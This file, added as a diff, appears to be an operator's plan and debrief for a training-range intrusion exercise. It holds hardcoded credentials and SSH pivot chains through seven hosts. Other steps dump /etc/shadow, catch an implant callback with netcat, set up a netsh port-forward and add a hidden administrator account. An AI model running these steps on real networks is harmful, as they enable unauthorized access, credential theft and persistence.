@@ -1,0 +1,189 @@
+ANGRYAARDVARK03
+2022-08-17
+Start Time: 0900
+Duration: 6 hours
+
+Credentials: engineer#::enshallah // caisson#::tread_depth // NOC_Admin#::5gftE8DCc8 // user#::P455w0rd //
+
+Tools/Techniques: 
+
+All connections will be established through SSH masquerades or via implant. 
+
+Ports in use will be dependent on target location and are subject to change. 
+
+All scanning must be conducted through secure tunnels. 
+
+Nmap and traceroute command(s) are authorized but unreliable and known to produce false positives. 
+
+Netsh tunnels are authorized for use on target 5 for the duration of the connection to target 6. Secure Copy (scp) is the preferred method for file transfers <10MB. 
+
+All secure hash functions are authorized with the exception of SHA-0 algorithm.
+
+Analysts on operation will make analytical judgment based off their target knowledge when providing credentials to test.
+
+Only three sets of credentials can be tested per target.
+
+ANGRYAARDVARK03
+2022-08-17
+IPs:
+>T1: 10.50.29.166
+->T2: 10.20.169.122
+-->T3: 10.20.169.238
+---> T4: 192.168.169.43
+----< T5: 192.168.169.111
+-----> T6: 192.168.169.122
+----> T7: 192.168.169.113
+
+T1:
+Hostname: EXT_RTR
+IP: 10.50.29.166
+OS: Linux v. unknown
+Creds: engineer#::enshallah
+Last Known SSH Port: 10123
+
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer4@10.50.29.166 -p 10123
+enshallah
+
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T2:
+Hostname: STORAGE1
+IP: 10.20.169.122
+OS: Windows v. unknown
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+ssh -S /tmp/T1 bad -O forward -L 2222:10.20.169.122:52203
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T3:
+Hostname: Vyos1
+IP: 10.20.169.238
+OS: Vyos
+Creds: NOC_Admin#::5gftE8DCc8
+Last Known SSH Port: 52230
+ssh -S /tmp/T2 bad -O forward -L 3333:10.20.169.238:52230
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin4@localhost
+5gftE8DCc8
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T4:
+Hostname: ADMIN1
+IP: 192.168.169.43
+OS: CentOS 7
+Creds: user#::P455w0rd
+Last Known SSH Port: Ask Analyst
+ssh -S /tmp/T3 bad -O forward -L 4444:192.168.169.43:33521
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user4@localhost
+P455w0rd
+
+Action: Perform SSH masquerade with credentials successful in previous operation. Conduct @@device survey@@ if not conducted during previous operation. Collect any files of interest. Maneuver to the next target by catching call-back from T5 (see T5 target section for implant information).
+
+##ASK EA to collect or not##
+FILE HASH CHECK
+FILE SIZE Check
+COLLECT
+SEND HASH to EA
+
+sudo md5sum /etc/shadow
+md5sum /etc/passwd
+md5sum /etc/group
+sudo md5sum /var/log/lynis.log
+sudo ls -la --block-size=M  /etc/shadow
+ls -la --block-size=M  /etc/passwd
+ls -la --block-size=M  /etc/group
+sudo ls -la --block-size=M  /var/log/lynis.log
+sudo ls -latr /var/log/lynis.log
+
+sudo cat /etc/shadow
+cat /etc/passwd
+cat /etc/group
+sudo cat /var/log/lynis.log
+
+ssh -S /tmp/T4 bad "sudo cat /var/log/lynis.log" > lynis.log
+
+##ask permission to catch a call back##
+catch a callback
+ 
+ssh -S /tmp/T4 bad -O forward -R192.168.169.43:8004:localhost:8004
+Let the Analyst know when you are ready to catch the Call-Back.
+nc -nlvp 8004
+
+*Note* T10implant.exe will call-back to T4/Admin1 on port <8000 + Student#> {i.e. Student8 will use port 8008 or Student12 will use 8012}. This should be redirected back to your Ops Station through secure tunnels. Let the Analyst know when you are ready to catch the Call-Back. Your implant does not require a malware report.
+
+T5:  
+Hostname: Unknown
+IP: 192.168.169.111
+OS: Windows v Unknown
+Creds: N/A
+Last Known SSH Port: None
+Security Product(s): Unknown
+Malware: Unknown
+Implant: T10implant.exe*
+Action: Access via implant call-back. Collect any files of interest. Perform netsh redirection to allow for connection to T6 utilizing a port in the 600## range. (i.e Student8 is 60008 or student 12 is 60012). Maneuver to next target.
+
+Ask for collection
+Ask for permission to netsh
+netsh interface portproxy show all
+netsh interface portproxy add v4tov4 listenport=60004 listenaddress=192.168.169.111 connectport=33521 connectaddress=192.168.169.220 protocol=tcp
+netsh interface portproxy delete v4tov4 listenport=60004 listenaddress=192.168.169.111
+
+###permission to delete####
+
+####DISCONNECT from T5 before T7####!!!!!
+
+
+T6:  
+Hostname: Unknown
+IP: 192.168.169.220
+OS: Linux v Unknown
+Creds: Unknown - Request analyst input
+Last Known SSH Port: 33521
+ssh -S /tmp/T4 bad -O forward -L 6666:192.168.169.111:60004
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user4@localhost
+P455w0rd
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform a @@device survey. Catalog any user accounts and record applicable login data.
+
+###ask EA for catalog###
+
+###DISCONNECT BEFORE T7####!!!!!!
+
+T7:  
+Hostname: Unknown
+IP: 192.168.169.113
+OS: Windows v Unknown
+Creds: Unknown - Request analyst input
+Last Known SSH Port: 33521
+
+ssh -S /tmp/T4 bad -O forward -L 7777:192.168.169.113:33521
+ssh -MS /tmp/T7 -p 7777 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user4@localhost
+P455w0rd
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform @@device survey. Catalog any user accounts and record applicable login data. Confirm for follow-on T10-effects. Conclude operation.
+ T10 Effect: If device is confirmed  to be "USER13" workstation, add a user account as outlined in Prior Approvals section.
+ 
+ ###ask EA what user account###
+ ###get MC approval####
+ ####timestamp effect####
+net user /add user34 P455w0rd
+net localgroup Administrators user34 /add
+
+net localgroup Administrators
+
+DEBRIEF 
+
+Operator: 1LT An
+
+Operation: ANGRYAARDVARK03
+
+MC: mc1
+
+Analyst: analyst1
+
+Description: ANGRYAARDVARK is a C-ISR mission profile. On T1, we redirected to T2. On T2, we redirected to T3. On T3, we redirected to T4. On T4, we collected files related to user information and we were able to catch a callback from an implant on T5. Once we got the callback, we had T5. On T5, we did not collect any files but we setup a netsh portproxy to masquerade to T6. On T6, we performed a survey and recorded all available user information on that device. We disconnected from T6 and T5 to get to T7. We ssh masquerade to T7 and we performed a survey. We also recorded user information on the device. After confirming T7 is USER13, we conducted an effect by adding a new administrator user, named "user34". Once we verified that user is persistent, we concluded the operations.
+
+
+ 
